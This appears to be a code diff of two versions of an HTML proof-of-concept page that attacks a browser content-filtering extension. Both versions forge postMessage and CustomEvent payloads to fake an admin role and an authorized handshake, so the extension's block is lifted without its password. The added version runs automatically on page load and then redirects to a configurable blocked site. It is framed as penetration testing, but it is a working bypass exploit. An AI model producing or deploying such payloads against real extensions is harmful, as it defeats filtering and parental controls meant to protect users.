@@ -1,51 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>White Hat Test #4: Privilege Escalation</title>
+    <title>Pen Test: Gateway Bypass</title>
     <style>
-        body { background: #121212; color: #00ff00; font-family: 'Courier New', monospace; padding: 40px; text-align: center; }
-        .exploit-card { border: 1px solid #00ff00; padding: 20px; display: inline-block; border-radius: 8px; background: #1a1a1a; }
-        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        button:hover { background: #00cc00; }
-        .log { margin-top: 20px; color: #888; font-size: 0.9em; text-align: left; }
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
+        .status { font-size: 20px; color: #ff0; }
     </style>
 </head>
 <body>
-
-    <div class="exploit-card">
-        <h2>Privilege Escalation POC</h2>
-        <p>Target Action: <code>youtube/settingsRequest</code></p>
-        <p>Goal: Force the extension to "unblock" or "bypass" without the admin password.</p>
-        
-        <button onclick="sendExploit()">Execute Escalation Attack</button>
-        
-        <div class="log" id="statusLog">Status: Waiting for interaction...</div>
-    </div>
+    <h1>INITIATING BYPASS GATEWAY</h1>
+    <p class="status" id="msg">Injecting payloads...</p>
 
     <script>
-        function sendExploit() {
-            const log = document.getElementById('statusLog');
-            
-            // This mimics the command your bridge script uses
-            // We use '*' to see if the extension accepts it from ANY origin
-            const payload = {
-                type: "youtube/settingsRequest",
-                detail: {
-                    payload: {
-                        bypassActive: true, 
-                        requestedBy: "attacker-site",
-                        forceUnblock: true
-                    }
-                }
-            };
+        const targetSite = "https://example-blocked-site.com"; // Change to your target
 
-            // Attempting to talk directly to the extension context
-            window.top.postMessage(payload, "*");
-            
-            log.innerText = "Status: Exploit payload broadcasted to top frame.";
-            console.log("Exploit Sent:", payload);
+        function executeBypass() {
+            // 1. Spoof the 'Authorized' handshake
+            window.dispatchEvent(new CustomEvent("youtube/settingsResponse", {
+                detail: { payload: { authorized: true, status: "success", showOverlay: false } }
+            }));
+
+            // 2. Spoof the 'Admin' role
+            window.postMessage({
+                type: "explicit-image-filter/openBlockReasonModal-response",
+                detail: { payload: { bypass: true, userRole: "admin", status: "verified" } }
+            }, "*");
+
+            document.getElementById('msg').innerText = "Payloads Sent. Redirecting...";
+
+            // 3. The Redirect Race
+            // We wait 500ms to ensure the events are in the bus before navigating
+            setTimeout(() => {
+                window.location.href = targetSite;
+            }, 500);
         }
+
+        // Run on load
+        window.onload = executeBypass;
     </script>
 </body>
 </html>
